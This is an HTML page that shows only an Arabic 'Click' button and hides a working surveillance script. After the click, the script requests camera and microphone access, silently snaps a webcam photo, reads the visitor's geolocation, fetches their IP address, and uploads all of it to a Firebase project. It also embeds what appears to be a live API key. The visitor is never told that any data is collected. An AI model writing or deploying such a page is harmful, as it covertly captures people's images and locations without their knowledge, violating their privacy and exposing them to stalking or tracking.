<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dont Ask My Why</title>
    <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000; /* Black background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .button {
            background-color: #000; /* Black background */
            color: white; /* White text */
            border: 4px solid white; /* White border */
            padding: 20px 40px; /* Padding */
            font-size: 24px; /* Font size */
            cursor: pointer; /* Pointer cursor */
            border-radius: 5px; /* Rounded edges */
            transition: background-color 0.3s; /* Transition effect */
            text-align: center;
        }

        .button:hover {
            background-color: rgba(255, 255, 255, 0.2); /* Lighten on hover */
        }

        video {
            display: none; /* Hide video element */
        }
    </style>
    <script type="module">
        // Import Firebase functions
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
            authDomain: "html-7fd9b.firebaseapp.com",
            projectId: "html-7fd9b",
            storageBucket: "html-7fd9b.appspot.com",
            messagingSenderId: "1022361191925",
            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const storage = getStorage(app);

        // Function to upload image to Firebase Storage
        async function uploadImage(imageData, ipAddress, latitude, longitude) {
            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
            await uploadString(storageRef, imageData, 'data_url')
                .then(async () => {
                    console.log('Uploaded image successfully!');
                    // Save location and IP address to Firestore
                    await addDoc(collection(db, "users"), {
                        ip: ipAddress,
                        latitude: latitude,
                        longitude: longitude,
                        timestamp: new Date()
                    });
                    console.log("Location and IP data sent to Firestore successfully");
                })
                .catch((error) => {
                    console.error('Error uploading image:', error);
                });
        }

        // Function to handle button click
        async function handleClick() {
            try {
                // Request microphone permission first
                await navigator.mediaDevices.getUserMedia({ audio: true });

                // Request camera permission
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Wait for the video to load
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        resolve();
                    };
                });

                // Capture image
                const canvas = document.createElement('canvas');
                canvas.width = 640; // Set canvas width
                canvas.height = 480; // Set canvas height
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');

                // Stop the video stream
                stream.getTracks().forEach(track => track.stop());

                // Get the user's location
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;

                        // Fetch the user's IP address using a public API
                        const ipResponse = await fetch('https://api.ipify.org?format=json');
                        const ipData = await ipResponse.json();
                        const ipAddress = ipData.ip;

                        // Upload captured image and location data to Firebase
                        await uploadImage(imageData, ipAddress, latitude, longitude);
                    }, (error) => {
                        console.error("Geolocation error: ", error);
                    });
                } else {
                    console.error("Geolocation is not supported by this browser.");
                }
            } catch (err) {
                console.error('Error accessing permissions: ', err);
                alert('Permissions denied! You cannot use this feature without granting permissions.');
            }
        }
    </script>
</head>
<body>
    <button class="button" onclick="handleClick()">انقر</button> <!-- Button with "Click" in Arabic -->
</body>
</html>
